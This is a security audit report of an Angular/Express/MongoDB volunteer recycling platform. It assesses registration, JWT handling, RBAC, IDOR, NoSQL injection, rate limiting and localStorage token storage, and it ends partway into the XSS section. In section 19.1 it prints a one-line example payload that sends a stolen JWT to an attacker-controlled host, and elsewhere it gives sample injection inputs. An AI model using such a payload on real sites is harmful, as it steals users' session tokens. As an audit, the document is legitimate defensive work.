# WasteZero — Complete Security & Architecture Audit

**Auditor Role:** Senior Application Security Engineer / Backend Architect / DevSecOps  
**Repository:** `d:\Coding\WasteZero3\Milestone3`  
**Stack:** Angular 18 (Frontend) + Node.js/Express 5 (Backend) + MongoDB/Mongoose + Socket.IO  
**Milestones Covered:** 1–3 (Existing) + Milestone 4 (Future Risk Analysis)  
**Audit Date:** 2026-08-10

---

## 1. Executive Summary

WasteZero is a well-structured MERN/MEAN-stack volunteer recycling platform. The codebase demonstrates **above-average security consciousness** for an academic milestone project: it uses OTP-gated registration, bcrypt-hashed OTPs, AES-256-GCM message encryption, strict RBAC middleware, ObjectId validation guards, regex escaping for ReDoS prevention, and atomic concurrency controls on pickup status transitions.

However, several real, exploitable vulnerabilities exist — not as theoretical possibilities but as confirmed code-level findings — that must be fixed before Milestone 4 is added. The most critical is that **any user can self-register as `admin`** during the initial deployment window, and that **JWT tokens carry the role in the payload** meaning a compromise of `JWT_SECRET` instantly grants admin access to an attacker. Milestone 4 will introduce high-severity risks (mass-data export without ownership scoping, CSV injection, report resource exhaustion) if protective controls are not built in from the start.

**Overall Security Score: 6.3 / 10**

---

## 2. Complete Architecture Discovered

### 2.1 Backend Architecture

```
HTTP Request / Socket.IO Handshake
         │
         ▼
[Express 5 / http.Server]  server.js
         │
         ├── Helmet (HTTP Security Headers)
         ├── CORS (CLIENT_URL allowlist)
         ├── express.json({ limit: '2mb' })
         ├── express.urlencoded({ limit: '2mb' })
         │
         ▼
[Rate Limiter Middleware] rateLimiter.middleware.js
  (loginLimiter, otpLimiter, generalLimiter)
         │
         ▼
[Auth Middleware] auth.middleware.js
  jwt.verify → User.findById → req.user
         │
         ▼
[RBAC Middleware] auth.middleware.js → authorize()
         │
         ▼
[Input Validation] express-validator schemas
  auth.validation / opportunity.validation /
  pickup.validation / message.validation
         │
         ▼
[Ownership Middleware] role.middleware.js
  checkOpportunityOwnership / checkPickupOwnershipByVolunteer /
  checkApplicationViewAccess / checkPickupNgoMatch
         │
         ▼
[Controller Layer]
  auth.controllers / users.controllers /
  opportunity.controllers / pickup.controllers /
  application.controllers / message.controller /
  notification.controller / match.controller
         │
         ▼
[Service Layer]
  opportunity.service / pickup.service /
  message.service / notification.service /
  matching.service / application.service
         │
         ▼
[Mongoose Models → MongoDB Atlas]
  User / Opportunity / Application / Pickup /
  Message / Notification / Otp
```

**Socket.IO flow:**
```
Angular Socket.IO Client
  auth: { token: 'Bearer <JWT>' }
         │
         ▼
[socket.middleware.js]
  jwt.verify → User.findById → socket.user
         │
         ▼
[sockets/index.js]
  socket.join(getUserRoom(socket.user.id))
         │
         ├── registerMessageEvents(io, socket)
         │     message:send → messageLimiter → assertValidSendPayload
         │     → messageService.createMessage (encrypt → MongoDB)
         │     → io.to(getUserRoom(receiverId)).emit('message:new')
         │
         └── registerNotificationEvents(io, socket)
               [currently empty — server-push only]
```

### 2.2 Frontend Architecture

```
Angular 18 SPA
│
├── app.routes.ts — Route definitions
│   ├── Public: /login, /register, /verify-otp, /forgot-password, /reset-password
│   └── Protected (canActivate: [authGuard])
│       ├── /dashboard
│       ├── /profile
│       ├── /change-password
│       ├── /opportunities/**
│       ├── /applications/**
│       ├── /messages/**
│       └── /pickups/**
│
├── core/guards/
│   ├── authGuard — checks localStorage 'user' token
│   ├── adminGuard — checks role === 'admin'
│   ├── ngoGuard — checks role === 'ngo'
│   ├── volunteerGuard — checks role === 'volunteer'
│   ├── ngoAdminGuard — checks role in ['ngo', 'admin']
│   └── volunteerNgoGuard — checks role in ['volunteer', 'ngo']
│
├── core/services/
│   ├── auth.service.ts — login/logout/register, JWT in localStorage
│   ├── socket.service.ts — socket.io-client wrapper
│   ├── opportunity.service.ts
│   ├── pickup.service.ts
│   ├── message.service.ts
│   ├── notification.service.ts
│   ├── application.service.ts
│   ├── match.service.ts
│   └── profile.service.ts
│
└── features/
    ├── auth/ (login, register, verify-otp, forgot-password, reset-password)
    ├── dashboard/
    ├── profile/
    ├── change-password/
    ├── opportunities/
    ├── applications/
    ├── messages/
    └── pickups/
```

---

## 3. Technology Stack

| Layer | Technology | Version |
|---|---|---|
| Frontend Framework | Angular | 18.x |
| Backend Runtime | Node.js | LTS |
| Web Framework | Express | 5.2.x |
| Database | MongoDB / Mongoose | 9.7.x |
| Authentication | JWT (jsonwebtoken) | 9.0.x |
| Password Hashing | bcryptjs | 3.0.x |
| OTP Hashing | bcryptjs | (shared) |
| Encryption | Node.js crypto (AES-256-GCM) | built-in |
| Real-time | Socket.IO | 4.8.x |
| File Upload | Multer + Cloudinary | 2.2.x / 2.x |
| Email | Nodemailer | 9.0.x |
| Rate Limiting | express-rate-limit + rate-limiter-flexible | 8.5.x / 11.2.x |
| Security Headers | Helmet | 8.2.x |
| Input Validation | express-validator | 7.3.x |

---

## 4. Authentication Audit

### 4.1 Registration

**VERIFIED — Registration allows admin self-registration [HIGH]**

File: [auth.controllers.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/auth.controllers.js#L17-L48)  
Lines 19–48. The `registerUser` controller accepts `role` from `req.body` and allows registration with role `'admin'`:
```javascript
const { name, username, email, password, role } = req.body;
const allowedRoles = ['volunteer', 'ngo', 'admin'];
if (!allowedRoles.includes(role)) { ... }
```
There is a guard that checks if an admin already exists (`User.exists({ role: 'admin' })`), but this means:
1. On a fresh deployment, **the first request to register with `role: "admin"` succeeds.**
2. There is a **TOCTOU race condition**: two near-simultaneous registrations can both pass `User.exists({ role: 'admin' })` returning false, both issue OTPs, and both eventually get to `verifyUserOtp`. The unique partial index `{ role: 1 }` on `admin` at line 110-113 of [users.model.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/models/users.model.js) enforces one admin at DB level, but one succeeds and one gets a `11000` duplicate key error — meaning the second concurrent request's OTP flow is half-executed before it fails. Gracefully handled at line 243.

**VERDICT:** The design of allowing any user to register as admin via the public API is the most significant architectural risk in the entire project. This should require an admin invitation token or be removed from the public registration flow.

**VERIFIED — Password hashed correctly:** bcrypt with `saltRounds = 10`. Pre-save hook at line 91 of users.model.js correctly skips rehashing via `isModified`. OTP hashing also uses bcrypt.

**VERIFIED — Email normalization:** `email.trim().toLowerCase()` applied consistently.

**VERIFIED — Duplicate check covers email AND username:** `$or` query at line 52 checks both.

**VERIFIED — Mass assignment on registration is NOT vulnerable:** The controller destructures specific fields (`name`, `username`, `email`, `password`, `role`) and builds `pendingPayload` manually. **No `Model.create(req.body)` pattern.**

**VERIFIED — Password never returned in responses:** `select: false` on the password field in the schema. The `toSafeUser()` helper in users.controllers.js explicitly builds only safe fields. NOT VULNERABLE.

### 4.2 Login

**VERIFIED — Login does not check suspension status [MEDIUM]**

File: [auth.controllers.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/auth.controllers.js#L105-L177)

The `loginUser` controller checks `isVerified` (line 142) but there is **no `isSuspended` field on the User model** currently. The `isSuspended` field doesn't exist yet (it's planned for Milestone 4). Once Milestone 4 adds it, if the login check is not updated, suspended users can keep logging in and receiving fresh JWTs.

**VERIFIED — Generic error message on failed login:** Line 125 and 134 both return `'Invalid username/email or password.'` — correctly prevents username enumeration.

**VERIFIED — Rate limiting on login:** `loginLimiter` applied in auth.routes.js — 20 requests per 15 minutes.

**POTENTIAL — 20 attempts per 15 minutes is too generous for a brute-force window:** 20 attempts × (10^6 / time to check bcrypt) = meaningful guessing space. Should be 5–10.

**VERIFIED — No refresh token mechanism:** JWT is single-token, 7-day expiry. Token cannot be invalidated before expiry. This is a **design limitation** (see JWT Audit).

**VERIFIED — JWT issued correctly:** `generateToken(user._id, user.role)` at line 151.

### 4.3 OTP System

**VERIFIED — OTPs hashed before storage:** `bcrypt.hash(otp, 10)` in issueOtp.js.

**VERIFIED — Brute-force lockout on OTP guessing:** 5 max attempts, then document deleted. (verifyOtp.js lines 42-48)

**VERIFIED — OTP replay prevention:** Document deleted after successful verification (line 67 of verifyOtp.js).

**VERIFIED — Constant-time comparison:** `bcrypt.compare()` used.

**VERIFIED — TOCTOU on OTP upsert:** Lines 41-53 of issueOtp.js handle the `11000` race by retrying with `findOneAndUpdate` (no upsert). Safe.

---

## 5. JWT Audit

**VERIFIED — Role embedded in JWT payload [HIGH RISK]**

File: [generateToken.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/utils/generateToken.js)

```javascript
jwt.sign({ id, role }, process.env.JWT_SECRET, { expiresIn: "7d" });
```

The `role` is embedded in the JWT. The auth middleware at line 35-37 of [auth.middleware.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/middlewares/auth.middleware.js) **does load the user from the database** (`User.findById(decoded.id)`), so the live role from the database is used for RBAC (not the JWT role). This is the **correct pattern**. However:
- The JWT `role` claim is unnecessary and adds confusion — a reviewer who sees `req.user.role` and traces it back must verify whether it came from DB or JWT.
- The role in the DB is authoritative (confirmed from code), but the JWT role is a minor information leakage vector if tokens are intercepted.

**VERIFIED — JWT algorithm:** jsonwebtoken default is `HS256`. No explicit algorithm specified, so the default applies. This is acceptable for symmetric signing.

**VERIFIED — JWT secret validation:** If `JWT_SECRET` is not set, `jwt.sign()` called with `undefined` will throw at runtime, but there is no startup validation to catch this early. `CHAT_ENCRYPTION_KEY` has startup validation (crypto.js line 20-25) but `JWT_SECRET` does not.

**VERIFIED — 7-day token lifetime:** Long-lived. No token revocation mechanism (blacklist). If a user changes password, their old tokens remain valid for up to 7 days.

**POTENTIAL — After password reset, old JWTs are not invalidated [MEDIUM]:** There is no `passwordChangedAt` field or token version on the User model. If an attacker steals a token and the victim resets their password, the attacker's token continues to work for up to 7 days.

**VERIFIED — Token stored in localStorage [MEDIUM]** — see Section 19 (Frontend Security).

---

## 6. RBAC Audit

**VERIFIED — Core RBAC is well-implemented.**

The `protect` → `authorize(...roles)` pattern is applied consistently across routes. The `authorize()` function reads `req.user.role` which comes from the live DB query in `protect`, making it reliable.

**VERIFIED — Opportunity ownership:**

`checkOpportunityOwnership` in role.middleware.js correctly: validates ObjectId (line 18), handles 404 (line 24), bypasses for admin with document attachment (line 29-32), strictly compares `ngo_id` to `req.user.id` (line 35).

**VERIFIED — Application RBAC:**

`checkApplicationOwnershipByNGO` correctly cross-validates via the opportunity. `checkApplicationViewAccess` correctly branches by role. Admin bypass is implemented at lines 120-123 and 125-131.

**VERIFIED — Pickup RBAC:**

Multiple pickup middleware functions correctly enforce: volunteer-owns-pickup, NGO-is-assigned-agent, admin-sees-all.

**VERIFIED — Admin cannot create pickups [DESIGN CORRECT]:** Route explicitly `authorize('volunteer')` at line 69 of pickup.routes.js.

**POTENTIAL — Admin can update ALL applications [MEDIUM]:**

File: [application.routes.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/routes/application.routes.js), line 68.  
`PUT /:id` uses `authorize("ngo", "admin")` followed by `checkApplicationOwnershipByNGO`. The ownership middleware at lines 65-71 of role.middleware.js says:
```javascript
if (req.user.role !== 'admin' && opportunity.ngo_id.toString() !== req.user.id.toString()) {
  return sendError(...)
}
```
So **admin can accept or reject any volunteer's application for any NGO's opportunity** without being the NGO owner. This may be intended, but should be documented. In a real platform this could be abuse surface.

**VERIFIED — NGO cannot access another NGO's applications [CORRECT]:** The ownership check via `opportunity.ngo_id` prevents cross-NGO access.

---

## 7. Admin Security Audit

**VERIFIED — No admin-specific routes or controllers exist yet.**

Milestone 4 has not been implemented. The only admin-capable actions currently are:
1. `GET /api/pickups/` (admin-only: `authorize('admin')`, getAllPickups)
2. `DELETE /api/opportunities/:id` (admin bypasses ownership, can delete any NGO's opportunity)
3. `PUT /api/applications/:id` (admin can update any application status)
4. `GET /api/applications` (admin sees all applications)

**POTENTIAL — Admin can delete any NGO's opportunity [MEDIUM]:**

File: [opportunity.routes.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/routes/opportunity.routes.js), line 58.  
```javascript
.delete(authorize('ngo', 'admin'), checkOpportunityOwnership, deleteOpportunity)
```
The `checkOpportunityOwnership` explicitly bypasses ownership for admin (lines 29-32 of role.middleware.js). This means an admin can hard-delete any opportunity. For Milestone 4, this should be a soft-delete with audit trail, not a permanent delete.

**POTENTIAL — No audit trail for admin actions:** Currently there is no `AdminLog` model or logging. All admin-privileged actions (delete opportunity, update any application) are unlogged. Any admin action could be disputed with no evidence.

**POTENTIAL — Cannot currently suspend users:** The `isSuspended` field does not exist on the User model yet. Milestone 4 must add it and update the login flow.

---

## 8. API Security Audit

| # | Method | Endpoint | Auth | Role | Input Validation | IDOR Risk | Injection Risk | Rate Limit | Sensitive Data Exposed | Severity |
|---|---|---|---|---|---|---|---|---|---|---|
| 1 | POST | /api/auth/register | No | Public | YES (express-validator + passwordValidator) | N/A | Low (body fields whitelisted) | YES (otpLimiter 10/10min) | No | MEDIUM (admin self-reg) |
| 2 | POST | /api/auth/login | No | Public | YES | N/A | Low | YES (loginLimiter 20/15min) | No (password excluded) | LOW |
| 3 | POST | /api/auth/verify-otp | No | Public | Partial | N/A | Low | YES (otpLimiter) | No | LOW |
| 4 | POST | /api/auth/resend-otp | No | Public | Partial | N/A | Low | YES (otpLimiter) | No | LOW |
| 5 | POST | /api/auth/forgot-password | No | Public | Partial | N/A | Low | YES (otpLimiter) | No (generic response) | LOW |
| 6 | POST | /api/auth/reset-password | No | Public | YES | N/A | Low | YES (otpLimiter) | No | LOW |
| 7 | GET | /api/users/profile | YES | Any | N/A | No (scoped to req.user.id) | N/A | NO | No | LOW |
| 8 | PUT | /api/users/profile | YES | Any | YES | No (scoped to req.user.id) | Low (fields whitelisted) | YES (generalLimiter) | No | LOW |
| 9 | POST | /api/users/change-password/send-otp | YES | Any | Minimal | No | N/A | YES (otpLimiter) | No | LOW |
| 10 | PUT | /api/users/change-password/verify-otp | YES | Any | YES | No | Low | YES (otpLimiter) | No | LOW |
| 11 | GET | /api/users/search | YES | volunteer/ngo | Partial | No (role-constrained output) | MEDIUM (regex on username) | NO | Low (name/username/role) | MEDIUM |
| 12 | POST | /api/opportunities | YES | ngo/admin | YES | N/A | Low | NO | No | MEDIUM |
| 13 | GET | /api/opportunities | YES | Any | YES (limit max 100) | No | No | NO | No | INFO |
| 14 | GET | /api/opportunities/:id | YES | Any | YES (ObjectId check) | No (anyone can view) | No | NO | No | INFO |
| 15 | PUT | /api/opportunities/:id | YES | ngo/admin | YES | No (ownership middleware) | Low | NO | No | LOW |
| 16 | DELETE | /api/opportunities/:id | YES | ngo/admin | YES (ObjectId) | No (ownership middleware) | No | NO | No | LOW |
| 17 | GET | /api/opportunities/my-opportunities | YES | ngo/admin | N/A | No (scoped to req.user.id) | N/A | NO | No | LOW |
| 18 | GET | /api/opportunities/search | YES | Any | Partial | No | MEDIUM (regex, no length limit on 'q') | NO | No | MEDIUM |
| 19 | GET | /api/opportunities/filter | YES | Any | Partial | No | MEDIUM (regex on location/skill) | NO | No | MEDIUM |
| 20 | POST | /api/applications | YES | volunteer | YES | No | No | NO | No | LOW |
| 21 | GET | /api/applications | YES | ngo/admin | Partial | No (NGO-scoped) | Low | NO | No | LOW |
| 22 | GET | /api/applications/my-applications | YES | volunteer | N/A | No (scoped to req.user.id) | N/A | NO | No | LOW |
| 23 | GET | /api/applications/:id | YES | Any | YES (ObjectId) | No (ownership middleware) | No | NO | No | LOW |
| 24 | PUT | /api/applications/:id | YES | ngo/admin | YES | No (ownership middleware) | Low | NO | No | LOW |
| 25 | DELETE | /api/applications/:id | YES | volunteer | YES | No (ownership middleware) | No | NO | No | LOW |
| 26 | POST | /api/pickups | YES | volunteer | YES | No | No | NO | No | LOW |
| 27 | GET | /api/pickups | YES | admin | YES (limit max 100) | No (admin all-access) | No | NO | No | LOW |
| 28 | GET | /api/pickups/my-pickups | YES | volunteer | Partial | No | No | NO | No | LOW |
| 29 | GET | /api/pickups/available | YES | ngo | Partial | No (NGO-profile-filtered) | No | NO | No | LOW |
| 30 | GET | /api/pickups/assigned-to-me | YES | ngo | Partial | No | No | NO | No | LOW |
| 31 | PATCH | /api/pickups/:id/status | YES | ngo | YES | No (ownership middleware) | No | NO | No | LOW |
| 32 | GET | /api/pickups/:id | YES | volunteer/ngo/admin | YES (ObjectId) | No (ownership middleware) | No | NO | No | LOW |
| 33 | PUT | /api/pickups/:id | YES | volunteer | YES | No (ownership middleware) | Low | NO | No | LOW |
| 34 | DELETE | /api/pickups/:id | YES | volunteer | YES | No (ownership middleware) | No | NO | No | LOW |
| 35 | PATCH | /api/pickups/:id/cancel | YES | volunteer | No | No (ownership middleware) | No | NO | No | LOW |
| 36 | GET | /api/messages/conversations | YES | Any | N/A | No (scoped to req.user.id) | N/A | NO | No | LOW |
| 37 | GET | /api/messages | YES | Any | YES (isMongoId on 'with') | MEDIUM | No | NO | No | MEDIUM |
| 38 | GET | /api/notifications | YES | Any | Partial | No (scoped to req.user.id) | N/A | NO | No | LOW |
| 39 | GET | /api/notifications/unread-count | YES | Any | N/A | No | N/A | NO | No | LOW |
| 40 | PUT | /api/notifications/:id/read | YES | Any | YES (ObjectId) | No (user_id scope in DB) | No | NO | No | LOW |
| 41 | PUT | /api/notifications/conversation/:conversationId/read | YES | Any | Partial | MEDIUM | No | NO | No | MEDIUM |

---

## 9. IDOR / BOLA Audit

### 9.1 Message History — IDOR [MEDIUM]

**VERIFIED — Partial IDOR on GET /api/messages**

File: [message.controller.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/message.controller.js#L28-L35)

```javascript
const getMessageHistory = async (req, res) => {
  const messages = await messageService.getMessagesBetween(req.user.id, req.query.with);
```

The `getMessagesBetween` function in message.service.js (lines 173-196) builds `conversationId = buildConversationId(userId1, userId2)` and fetches all messages matching that conversation. This is **correctly scoped** — the caller (`req.user.id`) is always one of the participants.

**However:** User A can call `GET /api/messages?with=userC_id` even if User A has never messaged User C. This returns an empty array (no messages) but confirms that a user ID exists. **Low information leakage.**

### 9.2 Notifications — IDOR [NOT VULNERABLE]

`markNotificationRead` uses `Notification.findOneAndUpdate({ _id: notificationId, user_id: userId }, ...)` — correctly scoped by user ownership.

`markConversationNotificationsRead` validates via `parts.includes(req.user.id)` at line 57 of notification.controller.js — correctly enforces participation.

### 9.3 Pickups — IDOR [NOT VULNERABLE]

`checkPickupViewAccess` middleware correctly handles all three roles: volunteer sees own, NGO sees assigned, admin sees all. ObjectId validation prevents CastErrors.

### 9.4 Applications — IDOR [NOT VULNERABLE]

`checkApplicationViewAccess` correctly branches by role with DB verification at each branch.

### 9.5 Opportunities — IDOR [NOT VULNERABLE]

`GET /api/opportunities/:id` is intentionally open to any authenticated user (correct for a marketplace).

### 9.6 Summary

The IDOR posture is good. The ownership middleware pattern is the project's strongest security design. However, the message history endpoint leaks user-ID existence.

---

## 10. Mass Assignment Audit

### 10.1 Profile Update — NOT VULNERABLE

File: [users.controllers.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/users.controllers.js#L78)

```javascript
const { name, locations, wasteTypes, skills, bio } = req.body;
```
Only specific fields are destructured. `role`, `email`, `password`, `isVerified`, `username` are never touched. **Safe.**

### 10.2 Opportunity Create/Update — NOT VULNERABLE

File: [opportunity.service.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/services/opportunity.service.js#L29-L54)

`createOpportunity` explicitly lists fields: `title, description, required_skills, duration, location, date, image, imagePublicId`. `ngo_id` is set from `req.user.id`, not from `req.body`. **Safe.**

`updateOpportunityInstance` uses an allowlist at lines 90-103: `['title', 'description', 'required_skills', 'duration', 'location', 'status', 'date']`. **Safe.**

### 10.3 Pickup Create/Update — NOT VULNERABLE

`createPickup` destructures `{ address, scheduledDate, preferredTimeSlot, wasteTypes, notes }` — `user_id` is from `req.user.id`, `agent_id` hardcoded to null. **Safe.**

`updatePickupInstance` uses explicit field iteration with an allowlist `['scheduledDate', 'wasteTypes', 'notes']`. **Safe.**

### 10.4 Application Create — NOT VULNERABLE

`applyForOpportunity` uses only `req.body.opportunity_id` with `volunteer_id: req.user.id`. Status is default 'pending'. **Safe.**

**OVERALL MASS ASSIGNMENT: NOT VULNERABLE** — consistent explicit field whitelisting pattern.

---

## 11. Input Validation Audit

### 11.1 Registration — GOOD

express-validator rules in auth.validation.js cover: name regex, username alphanumeric, email format, password strength. Password also re-validated via `passwordValidator` util.

**GAP:** No `role` validation in express-validator. Role is only checked in the controller. An invalid role returns 400 but from controller logic, not the validator — inconsistent pattern but not a security issue.

### 11.2 Opportunity — GOOD

Validation rules cover all required fields with type/length checks. Date validated via `new Date(value)` — accepts ISO 8601.

**GAP:** `description` has no length limit at the validator level (only Mongoose). A 10MB description string would pass validation and hit the DB layer. Body parser is limited to `2mb` so catastrophic DoS is prevented, but a validation-layer limit would be cleaner.

### 11.3 Pickup — GOOD

Time format validated with `TIME_REGEX`. Past-date prevention at both date and time level. Waste types validated as array.

**GAP:** Waste types have no allowlist — any string is accepted. An attacker could submit `["SQLi attempt", "<script>"]` and it would be stored and potentially displayed without sanitization.

### 11.4 Search Query (Opportunity) — MEDIUM GAP

File: [opportunity.controllers.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/controllers/opportunity.controllers.js#L138-L149)

```javascript
const { q } = req.query;
if (!q) { return sendError(...) }
const opportunities = await opportunityService.searchOpportunities(q);
```

**No length limit on `q`.** A very long search string (under 2MB body limit, but unlimited in query params) would:
1. Pass through to `escapeRegex(searchQuery.trim())` — RegEx escaping is correct.
2. Create a regex against MongoDB.

This is safe from ReDoS because the regex is escaped (no backtracking), but a 10,000-character query string would still create unnecessary MongoDB load.

### 11.5 Filter Endpoint — MEDIUM GAP

File: [opportunity.service.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/services/opportunity.service.js#L171-L184)

The `status` filter is passed directly:
```javascript
if (status && typeof status === 'string') queryFilter.status = status;
```
There is NO allowlist check on `status` before passing to MongoDB. The Mongoose schema enum would reject invalid values at write time, but since this is a READ query, invalid status values just return 0 results — not a security issue, but wastes a DB round-trip.

### 11.6 Pickup wasteTypes — No allowlist [MEDIUM]

As noted above, any string is accepted as a waste type. For Milestone 4 analytics, this could pollute recycling breakdown charts.

---

## 12. NoSQL Injection Audit

**VERIFIED — No unsafe MongoDB operators in user input.**

All queries use either:
1. Direct Mongoose `findById(id)` — safe
2. Explicit filter objects with trusted fields: `{ user_id: volunteerId, status: status }` — safe
3. `$or` with normalized string values — safe
4. `$regex` with `escapeRegex()` preprocessing — safe against injection

The `findOne({ $or: [{ username: ... }, { email: ... }] })` in loginUser is safe because values are string primitives, not objects.

**No `$where`, no eval, no unescaped operator injection from user input.**

**ONE POTENTIAL RISK — filter parameter on opportunity:**
```javascript
if (status && typeof status === 'string') queryFilter.status = status;
```
If an attacker sends `?status[$ne]=closed`, Express would parse it as `{ $ne: 'closed' }` object. The `typeof status === 'string'` check catches this — if `status` is an object, `typeof` returns `'object'`, not `'string'`, so it's rejected. **SAFE.**

---

## 13. Search / Regex Audit

**VERIFIED — ReDoS Prevention:** Both `opportunity.service.js` (line 15) and `pickup.service.js` (line 7) use:
```javascript
const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
```
This correctly escapes all regex special characters, preventing attacker-controlled backtracking.

**VERIFIED — User search regex:** In users.controllers.js (line 336), only `^` anchor prefix match is used with escaped input — safe and index-usable.

**MEDIUM — Search without result pagination/limit:**

File: [opportunity.service.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/services/opportunity.service.js#L153-L168)

`searchOpportunities` has NO `.limit()` call. If the DB has 10,000 opportunities and a user searches for a common letter like `"e"`, all 10,000 matching documents are returned. This is a **denial-of-service via legitimate search** path.

```javascript
return await Opportunity.find({ $or: [...] }).sort({ createdAt: -1 }).lean();  // NO LIMIT
```

Similarly `filterOpportunities` at line 183 has **no `.limit()` call**.

---

## 14. MongoDB Security Audit

**VERIFIED — No hardcoded credentials.** All secrets via `process.env`.

**VERIFIED — MongoDB URI not logged.** `db.js` logs `conn.connection.host` (not the full URI with credentials). Safe.

**VERIFIED — Password field excluded from queries:** `select: false` on `users.model.js`. The `protect` middleware uses `.select('-password')`. Login controller explicitly uses `.select('+password')`.

**VERIFIED — Proper indexes defined:** Users (email, username, role), Opportunities (ngo_id, status+createdAt, text index), Pickups (user_id, agent_id+status, status+city), Applications (opportunity_id+volunteer_id unique), Messages (conversation_id+createdAt), Notifications (user_id+isRead+createdAt).

**MEDIUM — Unbounded queries in search and filter** (discussed in §13).

**LOW — Missing search index on users.username for prefix search:**
In `searchUsers`, the query is:
```javascript
User.find({ role: roleFilter, username: usernameRegex })
```
The `username` field has an index but `$regex` with `^` prefix CAN use a B-tree index in MongoDB when the pattern starts with a literal prefix (which it does here due to anchoring). This is actually acceptable, but should be tested for performance on large user sets.

---

## 15. Password Security Audit

**VERIFIED — Bcrypt with salt=10:** Appropriate. Modern standard.

**VERIFIED — Plaintext never stored:** OTPs also hashed before storage. Registration flow hashes password in the controller before storing in OTP payload.

**VERIFIED — Password comparison via `user.matchPassword()`:** Instance method using `bcrypt.compare` — constant-time.

**VERIFIED — New password cannot match old password:** Both `resetPassword` and `changePasswordWithOtp` check via `user.matchPassword(newPassword)` before saving.

**VERIFIED — Password not returned in any API response.**

**NOT VERIFIED from source — Password history (more than 1 level):** Only the immediate previous password is checked. Not a security vulnerability, but a low-quality password policy gap.

---

## 16. CORS Audit

**VERIFIED — CORS is restrictive:**

File: [corsOrigin.js](file:///d:/Coding/WasteZero3/Milestone3/Backend/config/corsOrigin.js)

```javascript
const resolveCorsOrigin = () => {
  const clientUrl = process.env.CLIENT_URL;
  if (!clientUrl) {
    console.warn('...');
    return false;  // blocks all cross-origin requests if not configured
  }
  return clientUrl;
};
```

**Fail-closed:** If `CLIENT_URL` is not set, all cross-origin requests are blocked. **Excellent design.**

The same `resolveCorsOrigin()` is used for both the REST API (server.js line 46) and Socket.IO (sockets/index.js line 16). **Consistent.**

**VERIFIED — No wildcard `*` in production CORS.** The allowlist is a single `CLIENT_URL` string.

**LOW — Single-origin allowlist:** Cannot serve multiple frontends (e.g., mobile web + admin portal) without code change. Not a security issue, but an operational limitation.

**POTENTIAL — No origin validation on the CORS string itself:** If an admin accidentally sets `CLIENT_URL=*`, it opens wildcard CORS. There is no format validation of the `CLIENT_URL` value.

---

## 17. HTTP Security Headers

**VERIFIED — Helmet.js applied globally:**

```javascript
app.use(helmet()); // server.js line 39
```

Helmet 8.x defaults include:
- `Content-Security-Policy` (default)
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: SAMEORIGIN`
- `Referrer-Policy: no-referrer`
- `HSTS` (enabled in HTTPS environments)
- `X-XSS-Protection: 0` (correctly disables the legacy browser XSS filter)

**MEDIUM — No explicit CSP configuration:**

Default Helmet CSP is very broad. For an API-only backend that serves no HTML, a more restrictive CSP (or no CSP, relying on `default-src: 'none'`) would be more hardened. The frontend is served separately (Angular CLI), so CSP is most relevant there.

**MEDIUM — No CSP on Angular frontend:** The Angular `index.html` has no `<meta http-equiv="Content-Security-Policy">` tag and no server-side headers for the Angular dev server. If the Angular app is injected with XSS content, there is no CSP to prevent script execution.

---

## 18. Rate Limiting

**VERIFIED — Rate limits applied:**

| Limiter | Window | Max Requests | Applied To |
|---|---|---|---|
| `loginLimiter` | 15 min | 20 | POST /auth/login |
| `otpLimiter` | 10 min | 10 | /auth/register, /auth/verify-otp, /auth/resend-otp, /auth/forgot-password, /auth/reset-password, /users/change-password |
| `generalLimiter` | 10 min | 30 | PUT /users/profile |
| `messageLimiter` | 10 sec | 20 | Socket message:send |

**MISSING rate limits — HIGH risk for Milestone 4:**

- `GET /api/opportunities/search` — no rate limit. Repeated broad searches = MongoDB scan DoS.
- `GET /api/opportunities/filter` — no rate limit.
- `GET /api/messages/conversations` — no rate limit.
- `GET /api/messages` — no rate limit.
- `GET /api/notifications` — no rate limit.
- `GET /api/pickups/available` — no rate limit (aggregation with city/wasteType matching).
- **Future M4 report endpoints** — no rate limit planned yet.

**MEDIUM — Login limiter at 20 is too permissive:** For a password that is `8+ chars with complexity`, 20 guesses per 15 minutes is low impact, but consider 5–10 per 15 minutes to align with OWASP recommendations.

**MEDIUM — Rate limiter uses in-memory store:**
Both `express-rate-limit` (default: in-memory) and `rate-limiter-flexible` (RateLimiterMemory) are in-memory. This means:
1. Limits reset on server restart.
2. In a multi-instance deployment (horizontally scaled), each instance has its own counter — an attacker can bypass the limit by distributing requests across instances.

For production, use Redis (e.g., `rate-limiter-flexible` with `RateLimiterRedis` or `express-rate-limit` with `rate-limit-mongo`).

---

## 19. Frontend Security

### 19.1 JWT in localStorage [MEDIUM]

**VERIFIED:**

File: [auth.service.ts](file:///d:/Coding/WasteZero3/Milestone3/Frontend/src/app/core/services/auth.service.ts#L232-L233)

```typescript
localStorage.setItem('token', token);
localStorage.setItem('user', JSON.stringify(user));
```

`getToken()` reads from `localStorage.getItem('token')`.

**Risk:** `localStorage` is accessible to any JavaScript running on the same origin. If an XSS vulnerability exists anywhere in the Angular app (including third-party libraries), an attacker can execute:
```javascript
document.location = 'https://attacker.com/steal?t=' + localStorage.getItem('token');
```
And immediately steal the JWT.

**Why this is a real risk (not just theoretical):** The application renders `opportunity.description`, `message content`, user `bio`, and notification `message` — all user-controlled strings. If any of these render as HTML (via `innerHTML`), the XSS-to-token-theft chain is complete.

**Tradeoff:** HttpOnly cookies prevent this attack but require: CORS credential headers, backend to set/clear cookies, and CSRF protection. Given the current architecture (SPA + REST), migrating to HttpOnly cookies is feasible but requires changes to backend auth routes and CORS config. **This audit does not recommend migrating before Milestone 4 without team agreement** — it is a significant change.

**Immediate mitigation (lower risk, no architecture change):** Sanitize all user-controlled content before rendering. Angular's default template binding (`{{ }}` and `[textContent]`) is XSS-safe. The risk only exists if `[innerHTML]` or similar bindings are used — which needs to be verified in component templates.

### 19.2 XSS — NOT VERIFIED from component templates

